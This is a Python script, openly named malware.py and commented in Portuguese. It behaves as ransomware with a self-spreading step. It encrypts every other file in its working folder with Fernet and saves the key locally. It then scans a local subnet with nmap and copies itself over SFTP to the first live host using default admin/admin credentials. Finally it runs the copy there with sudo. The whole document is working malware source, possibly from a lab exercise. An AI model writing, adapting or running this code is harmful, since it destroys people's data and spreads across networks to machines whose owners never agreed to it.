#!/usr/bin/env python3

import os
import shutil
import paramiko
from cryptography.fernet import Fernet
import nmap
import socket

def get_own_ip():
    """Obtém o IP da própria máquina."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Usa um servidor DNS público (Google) para resolver o IP
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def scan_network(network):
    """Realiza a varredura da rede e retorna os hosts ativos, exceto o roteador e a própria máquina."""
    nm = nmap.PortScanner()
    own_ip = get_own_ip()
    router_ip = '192.168.6.1'
    
    try:
        nm.scan(hosts=network, arguments='-sn', timeout=60)  # Adiciona um tempo limite de 60 segundos
        active_hosts = [host for host in nm.all_hosts() if nm[host].state() == 'up' and host not in [own_ip, router_ip]]
        return active_hosts
    except Exception as e:
        print(f"Erro ao escanear a rede: {str(e)}")
        return []

def create_copy():
    try:
        shutil.copyfile("malware.py", "malware_copy.py")
        print("Cópia do arquivo malware.py criada como malware_copy.py")
        return "malware_copy.py"
    except Exception as e:
        print(f"Erro ao criar cópia do arquivo: {str(e)}")
        return None

def send_file_via_ssh(host, port, username, password, local_path, remote_path):
    try:
        transport = paramiko.Transport((host, port))
        transport.connect(username=username, password=password)
        sftp = paramiko.SFTPClient.from_transport(transport)
        
        sftp.put(local_path, remote_path)
        print(f"Arquivo {local_path} enviado para {host}:{remote_path}")

        sftp.close()
        transport.close()
        print("Envio via SSH concluído com sucesso.")
    except Exception as e:
        print(f"Erro ao enviar via SSH: {str(e)}")

def execute_remote_script(host, port, username, password, remote_path):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password)
        
        # Modifica permissões do arquivo para garantir que ele possa ser executado
        ssh.exec_command(f'chmod +x {remote_path}')
        
        # Executa o script remotamente com sudo
        command = f'sudo /usr/bin/python3 {remote_path}'
        stdin, stdout, stderr = ssh.exec_command(command)
        output = stdout.read().decode()
        errors = stderr.read().decode()
        
        print(f"Saída do script remoto: {output}")
        if errors:
            print(f"Erros do script remoto: {errors}")
        
        ssh.close()
    except Exception as e:
        print(f"Erro ao executar script remoto: {str(e)}")

files = []

for file in os.listdir():
    # Estes arquivos não serão encriptados 
    if file in ["malware.py", "thekey.key", "decrypt.py", "malware_copy.py", "malware"]:
        continue
    if os.path.isfile(file):
        files.append(file)

print("Arquivos Encriptados: ", files)

key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        content = thefile.read()
    content_encrypt = Fernet(key).encrypt(content)
    with open(file, "wb") as thefile:
        thefile.write(content_encrypt)

print("Todos os seus arquivos foram encriptados")

file_to_send = create_copy()

if file_to_send:
    network = '192.168.1.0/24'  # Substitua pela sua rede
    active_hosts = scan_network(network)

    if not active_hosts:
        print("Nenhum host ativo encontrado na rede.")
    else:
        print("Hosts ativos na rede:")
        for idx, host in enumerate(active_hosts):
            print(f"{idx + 1}: {host}")

        selected_host = active_hosts[0]  # Seleciona o primeiro host ativo
        print(f"Host ativo selecionado: {selected_host}")

        port = 22
        username = 'admin'  
        password = 'admin'    
        local_path = file_to_send
        remote_path = f'/home/admin/{os.path.basename(file_to_send)}'
        send_file_via_ssh(selected_host, port, username, password, local_path, remote_path)
        
        # Executar o script remotamente
        execute_remote_script(selected_host, port, username, password, remote_path)
else:
    print("Não foi possível prosseguir com o envio via SSH.")
